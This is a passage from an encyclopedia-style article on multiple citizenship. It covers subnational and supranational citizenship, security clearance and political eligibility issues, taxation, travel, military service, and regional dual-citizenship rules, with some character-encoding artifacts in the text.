always any right to vote in the host country, and there may be other restrictions (no consular protection) and rights (not subject to military conscription). Permanent residents may usually apply for citizenship after several years of residency. Depending both on the home country and the guest country, dual citizenship may or may not be permitted. * Some countries have concluded treaties regulating travel and access to employment: A citizen of an EU country can live and work indefinitely in other EU countries and the four EFTA countries, and citizens of the EFTA countries can live and work in EU countries. Such EU citizens can vote in EU, but not national or local, elections. The Trans-Tasman Travel Arrangement between Australia and New Zealand allows their citizens to live and work in the other country. A citizen of a GCC member state (Bahrain, Kuwait, Oman, Qatar, Saudi Arabia, and United Arab Emirates) can live and work in other member states, but dual citizenship (even with another GCC state) is not allowed. Indian citizens do not need a visa to travel to and work in Nepal or Bhutan (and vice versa), but none of the three countries allow dual citizenship. = Multiple citizenship \\"not recognized\\" = A statement that a country \\"does not recognize\\" multiple citizenship is confusing and ambiguous. Often, it is simply a restatement of the Master Nationality Rule, whereby a country treats a person who is a citizen of both that country and another in the same way as one who is a citizen only of the country. In other words, the country \\"does not recognize\\" that the person has any other citizenship for the purposes of the country's laws. In particular, citizens of a country may not be permitted to use another country's passport or travel documents to enter or leave the country, or be entitled to consulate assistance from the other country. Also, the dual national may be subject to compulsory military service in countries where they are considered to be nationals. = \\"Dormant\\" citizenship and \\"right of return\\" = The concept of a \\"dormant citizenship\\" means that a person has the citizenships of two countries, but as long as while living permanently in one country, their status and citizen's rights in the other country are \\"inactive\\". They will be \\"reactivated\\" when they move back to live permanently in the other country. This means, in spite of dual citizenship, only one citizenship can be exercised at a time. The \\"dormant citizenship\\" exists, for example, in Spain: Spanish citizens who have naturalized in an Iberoamerican country and have kept their Spanish citizenship are dual citizens, but have lost many of the rights of Spanish citizens resident in Spain‚Äîand hence the EU‚Äîuntil they move back to Spain. Some countries offer former citizens or citizens of former colonies of the country a simplified (re-)naturalization process. Depending on the laws of the two countries in question, dual citizenship may or may not be allowed. For details, see \\"right of return\\". = Multiple citizenship encouraged = Some countries are more open to multiple citizenship than others, as it may help citizens travel and conduct business overseas. Countries that have taken active steps towards permitting multiple citizenship in recent years include Switzerland (since January 1, 1992) and Australia (since April 4, 2002). Today, most advanced economies allow dual citizenship; notable exceptions which restrict or forbid it are Austria, Japan, the Netherlands, Singapore, and Spain. Of the newly industrialized countries, Brazil (with rare exceptions), Mexico, the Philippines, South Africa (with prior permission), Thailand, and Turkey (with prior permission) allow dual citizenship, while China (although Permanent Residents of Hong Kong and Macau may concurrently hold foreign passports), India, and Malaysia forbid it. Indonesia allows dual citizenship only until the age of 18 years. In former times, most countries on the American continent advertised their policy of unconditional birthright citizenship to become more attractive for immigrants. Despite wide acceptance of dual citizenship, industrialized countries (Canada and the United States) now try to protect themselves from birth tourism and uncontrollable immigration waves. Most of these countries still grant unconditional birthright citizenship (even for children of illegal immigrants). There have been some calls to change the laws, but, so far, they have not been successful. Brazil has such policies; the only people born in Brazil who do not automatically acquire Brazilian citizenship are those whose parents are residing in Brazil while serving their own countries (as diplomats, military attach√©s, cultural attach√©s and the like). In Australia, France, Germany, Ireland, New Zealand, South Africa, and the UK, a child born there is regarded as a citizen only if at least one parent is either a citizen or a legal permanent resident who has lived there for several years. (Germany usually restricts dual citizenship, so non-EU/non-Swiss citizens born and grown up abroad must usually renounce their old citizenship when naturalizing.) Some countries (e.g. Liechtenstein) allow only citizens by descent to have dual citizenship, but require naturalized citizens to renounce their old citizenship.  Subnational citizenship  Under the Fourteenth Amendment to the United States Constitution, all persons born or naturalized in the United States, and subject to the jurisdiction thereof, are citizens of the United States . Certain rights accrue as an incident of state citizenship and access to federal courts can sometimes be determined on State citizenship. In addition, tribal sovereignty affords members (\\"citizens\\") of federally recognized tribes (\\"nations\\") a status comparable to local citizenship. * Switzerland has a three-tier system of citizenship - Confederation, canton and commune (municipality). * Although considered part of the United Kingdom for British nationality purposes, the Crown Dependencies of Jersey, Guernsey and the Isle of Man have local legislation restricting certain employment and housing rights to those with \\"local status\\". Although the British citizenship of people from these islands gives them full citizenship rights when in the United Kingdom, it does not give them the rights that British citizenship generally confers when in other parts of the European Union (for example, the right to reside and work). In a similar way, a number of British Overseas Territories have a concept of \\"belonger status\\" for their citizens, in addition to their existing British citizenship. * Citizens of the People's Republic of China may be permanent residents of the Hong Kong or Macau Special Administrative Regions, or have household registration (hukou) somewhere in mainland China. School enrollment, work permission, and other civic rights and privileges (such as whether one may apply for a Hong Kong SAR passport, Macau SAR passport, or People's Republic of China passport) are tied to the region in which the citizen has permanent residence or household registration. Although within mainland China the hukou system has loosened in recent years, movement between Macau, Hong Kong, and the mainland remains controlled. Mainland Chinese who migrate to Hong Kong on one-way permits have their mainland hukou cancelled, while children born in Hong Kong to visiting mainland parents cannot receive mainland hukou unless they cancel their Hong Kong permanent residence status. * People from √Öland have joint regional (√Öland) and national (Finnish) citizenship. People with √Ölandic citizenship (hembygdsr√§tt) have the right to buy property and set up a business on √Öland, but Finns without regional citizenship cannot. Finns can get √Ölandic citizenship after living on the islands for five years, and √Ölanders lose their regional citizenship after living on the Finnish mainland for five years. * The territorial government of Puerto Rico began issuing Puerto Rican citizenship certificates in September 2007 after Juan Mari Br√°s, a lifelong supporter of independence, won a successful court victory that validated his claim that Puerto Rican citizenship was valid and can be claimed by anyone born on the island or with at least one parent who was born there. * In Bosnia and Herzegovina, citizens hold also citizenship of their respective entity, generally that in which they reside. This citizenship can be of the Republika Srpska or of the Federation of Bosnia and Herzegovina. One must have citizenship of at least one, but cannot hold both entity citizenships simultaneously.–ó–ê–ö–û–ù –û –î–†–ñ–ê–í–â–ê–ù–°–¢–í–£ –†–ï–ü–£–ë–õ–ò–ö–ï –°–†–ü–°–ö–ï (Serbian; English: LAW ON CITIZENSHIP OF THE REPUBLIC OF SRPSKA) * In Malaysia, a federation of thirteen states, each state gives certain benefits such as baby bonus, education loans and scholarships to children born in the state (or born to parents who were born in the state) and/or residing in the state. The states of Sabah and Sarawak in East Malaysia each has its own immigration control and permanent residency system; citizens from Peninsular Malaysian states are subject to immigration control in the two states. = Former instances = The use of internal passport to restrict residency and movement in the Soviet Union and in apartheid-era South Africa had the effect of tying local \\"citizens\\" to their assigned administrative entity (titular nations and bantustans, respectively). * Following the federalization of Czechoslovakia in 1968, Czechoslovak citizens also possessed an internal citizenship of either the Czech or Slovak Republic. Upon the nation's peaceful dissolution in 1993, this was used to determine whether they ought to receive Czech or Slovak citizenship. * Before the break-up of Yugoslavia in 1991, Yugoslav citizens possessed an internal citizenship of their own republic (Serbia, Croatia, Bosnia and Herzegovina, Slovenia, Macedonia, Montenegro) as well as Yugoslav citizenship. In Serbia and Montenegro, this system was in effect until 2006. * When Singapore joined Malaysia in 1963, all Singapore citizens were granted Malaysian citizenship. Singapore citizenship continued to exist as a subnational citizenship, and continued to be legislated by the Legislative Assembly of Singapore subject to the approval of the Parliament of Malaysia. Upon Singapore's independence from Malaysia in 1965, Malaysian citizenship was withdrawn from Singapore citizens, and all Singapore citizens became citizens of the new Republic of Singapore. * The Constitution of Jammu & Kashmir allowed on citizens of the state special privileges i.e. purchase of property, government jobs etc. However the Government of India revoked Article 370 of the Constitution of India in 2019 which lead to single citizenship over the country.  Supra-national citizenship  In European Union law, there is the concept of EU citizenship which flows from the Maastricht treaty which created a legal identity for the European Community and granted citizenship to all current and future citizens of a member state. An EU citizen is free to live and to work in another EU country for an unlimited period of time, but member states may reserve the right to vote in national elections, stand for national election, become a public servant in highly sensitive ministries (Defence for example), etc. only for their citizens, and in highly limited circumstances, may deport or refuse entry to citizens of other EU states. An EU state may place restrictions on the free movement rights of citizens of newly admitted states for several years, such provisions remain in force mostly for nationals of Croatia (no later than 2020); in the past, and to a lesser extent, such provisions also affected Estonia, Latvia, Lithuania, Poland, the Czech Republic, Slovakia, Hungary, Slovenia, Bulgaria and Romania. * The Nordic Passport Union, containing Denmark (including Faroe Islands and Greenland, unlike the EU), Sweden, Iceland, Norway (including Svalbard Islands) and Finland, allow citizens of members to travel across their borders without requiring Passports (just IDs), although this has been frozen for some borders (mainly between Denmark and the respective country) in response to the European migrant crisis. However, other provisions allowing citizens of members to live, study and work in each other's countries is still active. Citizens of members are often eligible for fast track processing to citizenships of other Members, with varying degrees of recognition/tolerance of dual citizenship among the states. * The United Kingdom recognises a Commonwealth citizenship for the citizens of the member states of the Commonwealth of Nations. The United Kingdom allows non-nationals who are Commonwealth citizens to vote and stand for election while resident there, while most other Commonwealth countries make little or no distinction between citizens of other Commonwealth nations and citizens of non-Commonwealth nations. * Commonwealth of Independent States nations (the republics of the former Soviet Union) are often eligible for fast track processing to citizenships of other CIS countries, with varying degrees of recognition/tolerance of dual citizenship among the states.  Effects and potential issues  It is often observed that dual citizenship may strengthen ties between migrants and their countries of origin and increase their propensity to remit funds to their communities of origin.Schuck, Peter H. 2002. Plural Citizenship. In: Randall Hansen, and Patrick Weil (eds.), Dual Nationality, Social Rights and Federal Citizenship in the U.S. and Europe, New York: Berghahn Books, p. 82; United Nations. 2006. International migration and development. Report of the Secretary-General at the Sixtieth session of the General Assembly. New York: United Nations, p. 63. Qualitative research on the impact of dual citizenship on the remittances, diaspora investments, return migration, naturalization and political behavior finds several ways in which multiple citizenship can affect these categories. As a bundle of rights, dual citizenship (a) enables dual citizens by granting special privileges, (b) affects their expectations about privileges in the decision-making process, and (c) eases the transaction process and reducing costs and risks, for example in the case of investing and conducting business. In addition, a dual legal status can have positive effects on diasporic identification and commitment to causes in the homeland, as well as to a higher naturalization rate of immigrants in their countries of residence.Naujoks, Daniel. 2013. Migration, Citizenship, and Development. Diasporic Membership Policies and Overseas Indians in the United States. New Delhi: Oxford University Press. = National cohesiveness = A study published in 2007 in The Journal of Politics explored questions re whether allowing dual citizenship impedes cultural assimilation or social integration, increases disconnection from the political process, and degrades national or civic identity/cohesiveness._ The rise in tension between mainstream and migrant communities is cited as evidence of the need to maintain a strong national identity and culture. They assert that the fact that a second citizenship can be obtained without giving anything up (such as the loss of public benefits, welfare, healthcare, retirement funds, and job opportunities in the country of origin in exchange for citizenship in a new country) both trivializes what it means to be a citizenRenshon, Stanley; \\"Dual Citizenship and American National Identity\\" Center for Immigration Studies 2001. and nullifies the consequential, transformational, and psychological change that occurs in an individual when they go through the naturalization process.\\"The Naturalization Oath Ceremony, and What It Means To Be a U.S. Citizen\\", davechen.net; accessed October 25, 2015. In effect, this approach argues, the self-centered taking of an additional citizenship contradicts what it means to be a citizen in that it becomes a convenient and painless means of attaining improved economic opportunity without any real consequences and can just as easily be discarded when it is no longer beneficial. Proponents argue that dual citizenship can actually encourage political activity providing an avenue for immigrants who are unwilling to forsake their country of origin either out of loyalty or due to a feeling of separation from the mainstream society because of language, culture, religion, or ethnicity.Faist, Thomas; Gerdes, Jurgen (Bielefeld University) \\"Dual Citizenship in an Age of Mobility\\", migrationpolicy.org, 2008; accessed October 25, 2015. Although, it may be noted that some countries have discriminatory immigration policies towards Citizens of a Single Citizen state. For example, Singaporean Citizens of Indian descent (A rather large part of Singaporean demographics) can apply for PIO (Person of Indian Origin) and then OCI (Overseas Citizenship of India) cards, which gives the same rights as Indian Citizenship apart from voting and standing for election. (Note: despite the name, it is not Citizenship in the technical sense) As well, some countries apply differing policies on Permanent Residence. New Zealand's \\"Permanent Resident Visa\\" never expires, for example. However, Permanent Residence in many countries is conditional on showing \\"sufficient ties\\" to the country in question. This varies. The UK requires presence in the United Kingdom one full day every two years; Belgium is one full day per year (extended to 6 if the person holding Type B PR is residing in the EU); and Singapore requires permission to leave, and has a time limit on this permission (if either of these are ignored, PR expires) A 2007 academic study concluded that dual citizens had a negative effect on the assimilation and political connectedness of first-generation Latino immigrants to the United States: * 32% less likely to be fluent in English * 18% less likely to identify as \\"American\\" * 19% less likely to consider the US as their homeland * 18% less likely to express high levels of civic duty * 9% less likely to register to vote * 15% less likely to have ever voted in a national election The study also noted that although dual nationality is likely to disconnect immigrants from the American political system and impede assimilation, the initial signs suggest that these effects seem to be limited almost exclusively to the first generation (although it is mentioned that a full assessment of dual nationality beyond the first generation is not possible with present data).Staton, Jeffrey K. (Florida State University); Jackson, Robert A. (Florida State University); Camache, Damaryas (University of Illinois): \\"Costly Citizenship, Dual Nationality Institutions, Naturalization, and Political Connectedness\\" (archived from the original on 2012-10-06) Concern over the effect of multiple citizenship on national cohesiveness is generally more acute in the United States. The reason for this is twofold: * The United States is a \\"civic\\" nation and not an \\"ethnic\\" nation. American citizenship is not based on belonging to a particular ethnicity, but on political loyalty to American democracy and values. Regimes based on ethnicity, which support the doctrine of perpetual allegiance as one is always a member of the ethnic nation, are not concerned with assimilating non-ethnics since they can never become true citizens. In contrast, the essence of a civic nation makes it imperative that immigrants assimilate into the greater whole as there is not an \\"ethnic\\" cohesiveness uniting the populace.2006 Dual Citizenship, Birthright Citizenship, and the meaning of Sovereignty Hearing before the Subcommittee on Immigration, Border Security, and Claims of the Committee on the Judiciary. 109th Congress, First Session, September 29, 2005, Serial No. 109‚Äì63. * The United States is an immigrant nation. As immigration is primarily directed at family reunification and refugee status rather than education and job skills, the pool of candidates tends to be poorer, less educated,Public Policy Institute of California: \\"Immigrants and Education\\" June 2008. and consistently from less stable countries (either non-democracies or fragile ones) with less familiarity or understanding of American values, making their assimilation both more difficult and more important. The degree of angst over the effects of dual citizenship seemingly corresponds to a country's model for managing immigration and ethnic diversity: * The differential exclusionary model, which accepts immigrants as temporary \\"guestworkers\\" but is highly restrictive with regard to other forms of immigration and to naturalisation of immigrants. Many countries in Asia such as Japan, China, Taiwan, Singapore and the countries of the Middle East tend to follow this approach. * The assimilationist model, which accepts that immigrants obtain citizenship, but on the condition that they give up some or all cultural, linguistic, or social characteristics that differ from those of the majority population. Europe is the primary example of this model, where immigrants are usually required to learn the official language, and cultural traditions such as Islamic dress are often barred in public spaces (see Immigration to Europe).Netherlands moves toward total ban on Muslim veils, Guardian, November 11, 2006.Globalisation, Journal of Ethnic and Migration Studies: \\"Multiculturalism and Individualism: the Swedish Debate on Dual Citizenship\\" July 1, 2002. * The multicultural model, which grants immigrants access to citizenship and to equal rights without demanding that they give up cultural, linguistic, or intermarriage restrictions or otherwise pressure them to integrate or inter-mix with the mainstream population. Canada, Australia, New Zealand and the United States have historically taken this approach, as exemplified by the fact that the United States has no official language, allowing official documents such as election ballots to be printed in a variety of languages. (See Immigration to the United States.) = Appearance of foreign allegiance = People with multiple citizenship may be viewed as having dual loyalty, having the potential to act contrary to a government's interests, and this may lead to difficulties in acquiring government employment where security clearance may be required. In the United States, dual citizenship is associated with two categories of security concerns: foreign influence and foreign preference. Contrary to common misconceptions, dual citizenship in itself is not the major problem in obtaining or retaining security clearance in the United States. As a matter of fact, if a security clearance applicant's dual citizenship is \\"based solely on parents' citizenship or birth in a foreign country\\", that can be a mitigating condition. However, taking advantage of the entitlements of a non-US citizenship can cause problems. For example, possession or use of a foreign passport is a condition disqualifying one from security clearance and \\"is not mitigated by reasons of personal convenience, safety, requirements of foreign law, or the identity of the foreign country\\" as is explicitly clarified in a Department of Defense policy memorandum which defines a guideline requiring that \\"any clearance be denied or revoked unless the applicant surrenders the foreign passport or obtains official permission for its use from the appropriate agency of the United States Government\\". This guideline has been followed in administrative rulings by the United States Department of Defense (DoD) Defense Office of Hearings and Appeals (DOHA) office of Industrial Security Clearance Review (ISCR), which decides cases involving security clearances for Contractor personnel doing classified work for all DoD components. In one such case, an administrative judge ruled that it is not clearly consistent with US national interest to grant a request for a security clearance to an applicant who was a dual national of the U.S. and Ireland, despite the fact that it has with good relations with the US.ISCR Case No. 02-21102, dod.mil (archived from the original on 2005-11-09). In Israel, certain military units, including most recently the Israeli Navy's submarine fleet, as well as posts requiring high security clearances, require candidates to renounce any other citizenship before joining, though the number of units making such demands has declined. In many combat units, candidates are required to declare but not renounce any foreign citizenship. On the other hand, Israel may view some dual citizens as desirable candidates for its security services due to their ability to legitimately enter neighbouring states which are closed to Israeli passport holders. The related case of Ben Zygier has caused debate about dual citizenship in Australia.  Multiple citizenship among politicians  This perception of dual loyalty can apply even when the job in question does not require security clearance. In the United States, dual citizenship is common among politicians or government employees. For example, Arnold Schwarzenegger retained his Austrian citizenship during his service as a Governor of California while US Senator Ted Cruz renounced his Canadian citizenship birthright on May 14, 2014. In 1999, the US Attorney General's office issued an official opinion that a statutory provision that required the Justice Department not to employ a non-\\"citizen of the United States\\"Treasury and General Government Appropriations Act, 1999, Pub. L. No. 105-277, 112 Stat. 2681-480, 2681-513-14, ¬ß 606 did not bar it from employing dual citizens.Eligibility of a Dual United States Citizen for a Paid Position with the Department of Justice, Opinions of the Attorney General, August 26, 1999 (Beth Nolan, Deputy Assistant Attorney General, Office of Legal Counsel) In Germany, politicians can have dual citizenship. David McAllister, who holds British and German citizenship, was minister president of the State of Lower-Saxony from July 1, 2010 to February 19, 2013. He was the first German minister president to hold dual citizenship. A small controversy arose in 2005 when Micha√´lle Jean was appointed the Governor General of Canada (official representative of the Queen). Although Jean no longer holds citizenship in her native Haiti, her marriage to French-born filmmaker Jean-Daniel Lafond allowed her to obtain French citizenship several years before her appointment. Article 23-8Perd la nationalit√© fran√ßaise le Fran√ßais qui, occupant un emploi dans une arm√©e ou un service public √©tranger ou dans une organisation internationale dont la France ne fait pas partie ou plus g√©n√©ralement leur apportant son concours, n'a pas r√©sign√© son emploi ou cess√© son concours nonobstant l'injonction qui lui en aura √©t√© faite par le Gouvernement.

Retrieved from LegiFrance December 12, 2008 with English translation of the French civil code allows the French government to withdraw French nationality from French citizens holding government or military positions in other countries and Jean's appointment made her both de facto head of state and commander-in-chief of the Canadian forces. The French embassy released a statement that this law would not be enforced because the Governor General is essentially a ceremonial figurehead. Nevertheless, Jean renounced her French citizenship two days before taking up office to end the controversy about it.CBC News: New governor general to give up French citizenship, cbc.ca, September 25, 2005. However, former Canadian Prime Minister John Turner was born in the United Kingdom and still retains his dual citizenship. St√©phane Dion, former head of the Liberal Party of Canada and the previous leader of the official opposition, holds dual citizenship with France as a result of his mother's nationality; Dion nonetheless indicated a willingness to renounce French citizenship if a significant number of Canadians viewed it negatively. Thomas Mulcair, Leader of the New Democratic Party and former leader of Official Opposition in the Canadian House of Commons also holds dual citizenship with France. In Egypt, dual citizens cannot be elected to Parliament. The Constitution of Australia, in Section 44(i), explicitly forbids people who hold allegiance to foreign powers from sitting in the parliament of Australia. This restriction on people with dual or multiple citizenship being members of parliament does not apply to the state parliaments, and the regulations vary by state. A court case (see Sue v Hill) determined that the UK is a foreign power for purposes of this section of the constitution, despite Australia holding a common nationality with it at the time that the Constitution was written, and that Senator-elect Heather Hill had not been duly elected to the national parliament because at the time of her election she was a subject or citizen of a foreign power. However, the High Court of Australia also ruled that dual citizenship on its own would not be enough to disqualify someone from validly sitting in Parliament. The individual circumstances of the non-Australian citizenship must be looked at although the person must make a reasonable effort to renounce his or her non- Australian citizenship. However, if that other citizenship cannot be reasonably revoked (for example, if it is impossible under the laws of the other country or impossible in practice because it requires an extremely difficult revocation process), then that person will not be disqualified from sitting in Parliament.. In the 2017 Australian parliamentary eligibility crisis, the High Court disqualified Australia's Deputy Prime Minister and four Senators because they held dual citizenship, despite being unaware of their citizenship status when elected. In New Zealand, controversy arose in 2003 when Labour MP Harry Duynhoven applied to renew his citizenship of the Netherlands. Duynhoven, the New Zealand-born son of a Dutch-born father, had possessed dual citizenship from birth but had temporarily lost his Dutch citizenship due to a 1995 change in Dutch law regarding non-residents. While New Zealand's Electoral Act allowed candidates with dual citizenship to be elected as MPs, Section 55 of the Act stated that an MP who applied for citizenship of a foreign power after taking office would forfeit his/her seat. This was regarded by many as a technicality, however; and Duynhoven, with his large electoral majority, was almost certain to re-enter Parliament in the event of a by-election. As such, the Labour Government retrospectively amended the Act, thus enabling Duynhoven to retain his seat. The amendment, nicknamed \\"Harry's Law\\", was passed by a majority of 61 votes to 56. The revised Act allows exceptions to Section 55 on the grounds of an MP's country/place of birth, descent, or renewing a foreign passport issued before the MP took office. Both the former Estonian president Toomas Hendrik Ilves and the former Lithuanian president Valdas Adamkus had been naturalized US citizens prior to assuming their offices. Both have renounced their US citizenships: Ilves in 1993 and Adamkus in 1998. This was necessary because neither individual's new country permits retention of a former citizenship. Adamkus was a high-ranking official in the Environmental Protection Agency, a federal government department, during his time in the United States. Former Latvian president Vaira Vƒ´ƒ∑e-Freiberga relinquished Canadian citizenship upon taking office in 1999.Article on renunciation of prior citizenship to holding public office, csmonitor.com, July 7, 1999. = Taxation = In some cases, multiple citizenship can create additional tax liability. Almost all countries that impose tax normally base tax liability on source or residency. A very few countries tax their non-resident citizens on foreign income; examples include the United States, Eritrea, and the Philippines * Residency: a country may tax the income of anyone who lives there, regardless of citizenship or whether the income was earned in that country or abroad (most common system); * Source: a country may tax any income generated there, regardless of whether the earner is a citizen, resident, or non-resident; or * Citizenship: a country may tax the worldwide income of its citizens, regardless of whether they reside in that country or whether the income was sourced there (as of 2012: only the United States and Eritrea). A few other countries tax based on citizenship in limited situations: Finland, France, Hungary, Italy, and Spain. Under Spanish tax law, Spanish nationals and companies still have tax obligations with Spain if they move to a country that is in the list of tax havenshttps://www.agenciatributaria.es/static_files/AEAT/Contenidos_Comunes/La_Agencia_Tributaria/Segmentos_Usuarios/Empresas_y_profesionales/Foro_grandes_empresas/Criterios_generales/Lista_paraisos_fiscales_DGT.pdf and cannot justify a strong reason, beside tax evasion. They are required to be residents of that country for a minimum of 5 years; after which they are free from any tax obligations. U.S. persons living outside the United States are still subject to tax on their worldwide income, although US law provides measures to reduce or eliminate double taxation issues for some. It has been reported that some US citizens have relinquished US citizenship in order to avoid possible taxes, the expense and complexity of compliance, or because they have been deemed unacceptable to financial institutions in the wake of FATCA. A person with multiple citizenship may have a tax liability to his country of residence and also to one or more of his countries of citizenship; or worse, if unaware that one of his citizenships created a tax liability, that country may consider the person to be a tax evader. Many countries and territories have signed tax treaties or agreements for avoiding double taxation. Still, there are cases in which a person with multiple citizenship will owe tax solely on the basis of holding one such citizenship. For example, consider a person who holds both Australian and United States citizenship, lives and works in Australia. He would be subject to Australian taxation, because Australia taxes its residents, and he would be subject to U.S. taxation because he holds US citizenship. In general, he would be allowed to subtract the Australian income tax he paid from the US tax that would be due. In addition, the US will allow some parts of foreign income to be exempt from taxation; for instance, in 2006 the foreign earned income exclusion allowed up to US$82,400 of foreign salaried income to be exempt from income tax (in 2014, this was increased to US$97,600). This exemption, plus the credit for foreign taxes paid mentioned above, often results in no US taxes being owed, although a US tax return would still have to be filed. In instances where the Australian tax was less than the US tax, and if there was income that could not be exempted from US tax, the US would expect any tax due to be paid. The United States Internal Revenue Service has excluded some regulations such as Alternative Minimum Tax (AMT) from tax treaties that protect double taxation. In its current format even if US citizens are paying income taxes at a rate of 56%, far above the maximum US marginal tax rate, the citizen can be subject to US taxes because the calculation of the AMT does not allow full deduction for taxes paid to a foreign country. Other regulations such as the post date of foreign mailed tax returns are not recognized and can result in penalties for late filing if they arrive at the IRS later than the filing date. However, the filing date for overseas citizens has a two-month automatic extension to June 15.US Internal Revenue Service: U.S. Citizens and Resident Aliens Abroad \\"If you are a U.S. citizen or resident alien residing overseas, or are in the military on duty outside the U.S., on the regular due date of your return, you are allowed an automatic 2-month extension to file your return and pay any amount due without requesting an extension. For a calendar year return, the automatic 2-month extension is to June 15. If you are unable to file your return by the automatic 2-month extension date, you can request an additional extension to October 15 by filing Form 4868 before the automatic 2-month extension date. However, any tax due payments made after June 15 will be subject to both interest charges and failure to pay penalties.\\" (IRS, 2012) = Issues with international travel = Many countries, even those that permit multiple citizenship, do not explicitly recognise multiple citizenship under their laws: individuals are treated either as citizens of that country or not, and their citizenship with respect to other countries is considered to have no bearing. This can mean (in Iran, Mexico, many Arab countries, and former Soviet republics) that consular officials abroad may not have access to their citizens if they also hold local citizenship. Some countries provide access for consular officials as a matter of courtesy, but do not accept any obligation to do so under international consular agreements. The right of countries to act in this fashion is protected via the Master Nationality Rule. Multiple citizens who travel to a country that claims them as a citizen may be required to enter or leave the country on that country's passport. For example, a United States Department of State web page on dual nationality contains the information that most US citizens, including dual nationals, must use a US passport to enter and leave the United States. Under the terms of the South African Citizenship Act, it is an offence for someone aged at least 18 with South African citizenship and another citizenship to enter or depart the Republic of South Africa using the passport of another country. They may also be required, before leaving the country, to fulfill requirements ordinarily required of its resident citizens, including compulsory military service or exit permits. In accordance with the European Travel Information and Authorisation System (ETIAS), the EU citizens who have multiple nationalities will be obliged to use the passport issued by an EU Member State for entering the Schengen area.Regulation (EU) 2019/817 of the European Parliament and of the Council of 20 May 2019 on establishing a framework for interoperability between EU information systems in the field of borders and visa and amending Regulations (EC) No 767/2008, (EU) 2016/399, (EU) 2017/2226, (EU) 2018/1240, (EU) 2018/1726 and (EU) 2018/1861 of the European Parliament and of the Council and Council Decisions 2004/512/EC and 2008/633/JHA = Military service = Military service for dual nationals can be an issue of concern. Several countries have entered into a Protocol relating to Military Obligations in Certain Cases of Double Nationality established at The Hague, 12 April 1930. The protocol states \\"A person possessing two or more nationalities who habitually resides in one of the countries whose nationality he possesses, and who is in fact most closely connected with that country, shall be exempt from all military obligations in the other country or countries. This exemption may involve the loss of the nationality of the other country or countries.\\" The protocol has several provisions. =Healthcare= The right to healthcare in countries with a public health service is often discussed in relation to immigration but is a non-issue as far as nationality is concerned. The right to use public health services may be conditioned on nationality and/or on legal residency. For example, anyone legally resident and employed in the UK is entitled to use the National Health Service; non- resident British citizens visiting Britain do not have this right, unless they are UK state pensioners who hold a UK S1 form.  Dominant and effective nationality  The potential issues that dual nationality can pose in international affairs has long been recognized, and as a result, international law recognizes the concept of \\"dominant and effective nationality\\", under which a dual national will hold only one dominant and effective nationality for the purposes of international law to one nation that holds their primary national allegiance, while any other nationalities are subordinate. The theory of dominant and effective nationality emerged as early as 1834. Customary international law and precedent have since recognized the idea of dominant and effective nationality, with the Nottebohm case providing an important shift. The International Court of Justice defines effective nationality as a \\"legal bond having as its basis a social fact of attachment, a genuine connection of existence, interests and sentiments, together with the existence of reciprocal rights and duties\\". International tribunals have adopted and used the principle. Under customary international law, tribunals dealing with questions involving dual nationality must determine the effective nationality of the dual national by determining to which nation the individual has more of a \\"genuine link\\". Unlike dual nationality, one may only be the effective national of a single nation, and different factors are taken into consideration to determine effective nationality, including habitual residence, family ties, financial and economic ties, cultural integration, participation in public life, armed forces service, and evidence of sentiment of national allegiance.  Dual citizenship by region  = Africa = Dual citizenship is allowed in Angola, Burundi, Comoros, Cabo Verde, C√¥te d'Ivoire, Djibouti, Gabon, Gambia, Ghana, Kenya, Mali, Morocco, Mozambique, Niger, Nigeria, Rwanda, Senegal, S√£o Tom√© and Pr√≠ncipe, Sierra Leone, Sudan, Tunisia, Uganda, and Zambia; others restrict or forbid dual citizenship. Lesotho restricts dual citizenship, but observes jus soli. There are problems regarding dual citizenship in Namibia.Dual citizenship of Namibia Eritreans, Egyptians, and South Africans wanting to take another citizenship need permission to maintain their citizenship. Eritrea taxes its citizens worldwide, even if they have never lived in the country.The 2% Taks for Eritreans in the diaspora, I DSP-groep BV & Tilburg School of Humanities, Department of Culture studies Equatorial Guinea does not allow dual citizenship, but it is allowed for children born abroad, if at least one parent is a citizen of Equatorial Guinea. = The Americas = Most countries in the Americas allow dual citizenship, some only for citizens by descent or with other countries, usually also in the region with which they have agreements. Some countries (e.g., Argentina, Bolivia) do not allow their citizens to renounce their citizenship, so they keep it even when naturalizing in a country that forbids dual citizenship. Most countries in the region observe unconditional jus soli, i.e. a child born there is regarded as a citizen even if the parents are not. Some countries, such as the Dominican Republic, Ecuador, Guatemala, Honduras, Mexico, Nicaragua, and Uruguay, allow renunciation of citizenship only if it was involuntarily acquired by birth to non-citizen parents. Dual citizenship is restricted or forbidden in Cuba, Suriname, and Guyana. = Asia-Pacific = Most countries in the Asia-Pacific region restrict or forbid dual citizenship. In some of these countries (e.g. Iran, North Korea, Thailand), it is very difficult or even impossible for citizens to renounce their citizenship, even if a citizen is naturalized in another country. * Australia, Fiji, New Zealand, Philippines, South Korea, Tonga, Vanuatu, and Vietnam allow dual citizenship. Australia's constitution does not permit dual nationals to be elected to the federal Parliament. *Cambodia allows dual citizenship and observes jus soli for children born to legal permanent residents born in Cambodia or to children whose parents are unknown. *Hong Kong allows dual citizenship for citizens by birth but does not permit applicants for naturalization to retain their prior citizenship. However, there is no such thing as Hong Kong citizenship. The Nationality law of the People's Republic of China (CNL) has been applied in the Hong Kong Special Administrative Region since 1 July 1997. Hong Kong residents who are Chinese citizens holding foreign passports must make a declaration of change of nationality to the HKSAR Immigration Department in order to be regarded as foreign nationals. Foreign nationals or stateless persons can apply for naturalisation as a Chinese national provided that they are Hong Kong residents and meet the requirements under CNL. *South Korea allows any foreign born person meeting income, language, culture, and domicile conditions to become a naturalized citizen. It also allows foreign born nationals who married to a Korean citizen, Korean men holding dual citizenship by birth who served in the Republic of Korea Armed Forces as compulsory military service, Korean women with multiple nationalities by birth who has vowed her intention not to exercise her foreign nationality in the Republic of Korea by the age of 22 and overseas Koreans at least 65 years of age.Nationality Law, Ministry of Government Legislation; accessed September 7, 2015. *Taiwan allows dual citizenship for citizens by birth or for its own citizen but do not permit foreign applicants for naturalization to retain their prior citizenship unless they are senior professionals or have made outstanding contributions to Taiwan. *Burmese nationality law forbids its citizens to have dual citizenship, and foreigners cannot become naturalized citizens, unless they can prove a close familial connection to the country. *Pakistan restricts dual citizenship (see above), but observes jus soli. *In Papua New Guinea, there was overwhelming support from parliament to amend their Constitution to allow dual citizenship, however the law had yet to come into force .PNG Passes Reciprocal Dual Citizenship Law, Pacific Islands Report; accessed September 7, 2015. *In the Philippines, Republic Act No. 9225, approved 29 August 2003, provided that natural-born citizens of the Philippines who had lost their Philippine citizenship by reason of their naturalization as citizens of a foreign country would be deemed to have re-acquired Philippine citizenship upon taking an oath of allegiance to the Republic, that their children whether legitimate, 